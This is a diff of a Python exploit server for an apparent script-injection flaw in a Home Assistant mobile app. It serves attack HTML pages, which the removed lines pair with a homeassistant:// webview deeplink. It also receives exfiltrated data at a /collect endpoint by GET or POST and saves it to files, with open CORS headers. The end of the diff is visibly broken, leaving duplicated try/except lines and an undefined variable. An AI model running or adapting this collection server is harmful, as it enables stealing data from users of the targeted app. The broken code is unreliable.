@@ -1,80 +1,58 @@
 #!/usr/bin/env python3
 """
-Home Assistant 1.3 - Dynamic Script Injection Risk
-攻击服务器：提供恶意页面 + 数据回收
-
-端口: 8000 HTTP 主服�?
-
-接口:
-  GET  /collect?d=<data>    统一数据回收
-  GET  /exp/1.3              攻击页面
+1.3 Dynamic Script Injection Risk - EXP Server
 """
+import http.server, json, urllib.parse, os, socket
 
-import os
-import time
-import socket
-import urllib.parse as up
-from http.server import HTTPServer, BaseHTTPRequestHandler
-
-OUT_DIR = "received"
-EXP_DIR = "exp"
+PORT = 8000
+OUT_DIR = os.path.join(os.path.dirname(__file__), "received")
+EXP_DIR = os.path.join(os.path.dirname(__file__), "exp")
 os.makedirs(OUT_DIR, exist_ok=True)
 
-def _get_local_ip():
+def get_ip():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         ip = s.getsockname()[0]
         s.close()
         return ip
-    except Exception:
+    except:
         return "127.0.0.1"
 
-LOCAL_IP = _get_local_ip()
-print(f"[*] 本机IP地址: {LOCAL_IP}")
-print(f"[*] 攻击页面: http://{LOCAL_IP}:8000/exp/1.3")
-print(f"[*] Deeplink: homeassistant://webview?url=http://{LOCAL_IP}:8000/exp/1.3")
+LOCAL_IP = get_ip()
 
-# ============================================================
-# HTTP 服务
-# ============================================================
-class ExpHandler(BaseHTTPRequestHandler):
-
-    def log_message(self, format, *args):
-        print(f"[{time.strftime('%H:%M:%S')}] {args[0]}")
-
+class H(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
-        parsed = up.urlparse(self.path)
-        path = parsed.path
-        qs = up.parse_qs(parsed.query)
-
-        # --- 数据回收 ---
-        if path == "/collect":
-            data = qs.get("d", [""])[0]
-            if data:
-                ts = str(int(time.time() * 1000))
-                fname = f"collected_{ts}.txt"
-                with open(os.path.join(OUT_DIR, fname), "w", encoding="utf-8") as f:
-                    f.write(up.unquote(data))
-                print(f"[+] 数据已回�?-> {fname}")
-                print(f"    内容: {up.unquote(data)[:200]}")
+        p = urllib.parse.urlparse(self.path)
+        
+        if p.path == "/collect":
+            q = urllib.parse.parse_qs(p.query)
+            d = q.get("d", [""])[0]
             self.send_response(200)
             self.send_header("Access-Control-Allow-Origin", "*")
             self.end_headers()
+            if d:
+                ts = str(int(__import__('time').time() * 1000))
+                fp = os.path.join(OUT_DIR, f"collected_{ts}.txt")
+                with open(fp, "w", encoding="utf-8") as f:
+                    f.write(urllib.parse.unquote(d))
+                print(f"[+] collected: {d[:100]}")
             self.wfile.write(b"ok")
             return
 
-        # --- 攻击页面 ---
-        if path == "/exp/1.3":
-            html_path = os.path.join(EXP_DIR, "1.3.html")
-            if os.path.exists(html_path):
-                with open(html_path, "r", encoding="utf-8") as f:
-                    content = f.read()
-                content = content.replace("{{LOCAL_IP}}", LOCAL_IP)
+        if p.path.startswith("/exp/"):
+            fn = os.path.basename(p.path) or "1.3.html"
+            if not fn.endswith(".html"):
+                fn += ".html"
+            fp = os.path.join(EXP_DIR, fn)
+            if os.path.exists(fp):
                 self.send_response(200)
                 self.send_header("Content-Type", "text/html; charset=utf-8")
                 self.send_header("Access-Control-Allow-Origin", "*")
                 self.end_headers()
+                with open(fp, "r", encoding="utf-8") as f:
+                    content = f.read()
+                content = content.replace("{{LOCAL_IP}}", LOCAL_IP)
                 self.wfile.write(content.encode("utf-8"))
             else:
                 self.send_response(404)
@@ -82,22 +60,51 @@ class ExpHandler(BaseHTTPRequestHandler):
                 self.wfile.write(b"exp not found")
             return
 
-        # --- 默认 ---
         self.send_response(200)
         self.send_header("Content-Type", "text/html; charset=utf-8")
         self.end_headers()
         self.wfile.write(f"""<html><body>
-<h2>Home Assistant Bridge Exploit Server</h2>
+<h2>1.3 EXP Server</h2>
 <p>IP: {LOCAL_IP}</p>
-<p>攻击页面: <a href="/exp/1.3">/exp/1.3</a></p>
-<p>Deeplink: <code>homeassistant://webview?url=http://{LOCAL_IP}:8000/exp/1.3</code></p>
+<p>Exp: <a href="/exp/1.3">/exp/1.3</a></p>
 </body></html>""".encode("utf-8"))
 
+    def do_POST(self):
+        cl = int(self.headers.get("Content-Length", 0))
+        body = self.rfile.read(cl) if cl > 0 else b""
+        if self.path == "/collect":
+            self.send_response(200)
+            self.send_header("Access-Control-Allow-Origin", "*")
+            self.end_headers()
+            ts = str(int(__import__('time').time() * 1000))
+            fp = os.path.join(OUT_DIR, f"collected_{ts}.txt")
+            with open(fp, "wb") as f:
+                f.write(body)
+            print(f"[+] POST: {body[:100]}")
+            self.wfile.write(b"ok")
+            return
+        self.send_error(405)
+
+    def do_OPTIONS(self):
+        self.send_response(200)
+        self.send_header("Access-Control-Allow-Origin", "*")
+        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
+        self.send_header("Access-Control-Allow-Headers", "*")
+        self.end_headers()
+
+    def log_message(self, fmt, *args):
+        print(f"[{self.client_address[0]}] {fmt % args}")
+
 if __name__ == "__main__":
-    port = 8000
-    server = HTTPServer(("0.0.0.0", port), ExpHandler)
-    print(f"[*] 服务器启�? http://0.0.0.0:{port}")
+    print(f"[*] 1.3 EXP Server on :{PORT}")
+    print(f"[*] IP: {LOCAL_IP}")
+    print(f"[*] Exp: http://{LOCAL_IP}:{PORT}/exp/1.3")
+    s = http.server.HTTPServer(("0.0.0.0", PORT), H)
     try:
+        s.serve_forever()
+    except KeyboardInterrupt:
+        print("\n[*] Done")
+        s.shutdown()
         server.serve_forever()
     except KeyboardInterrupt:
         print("\n[*] 服务器已停止")
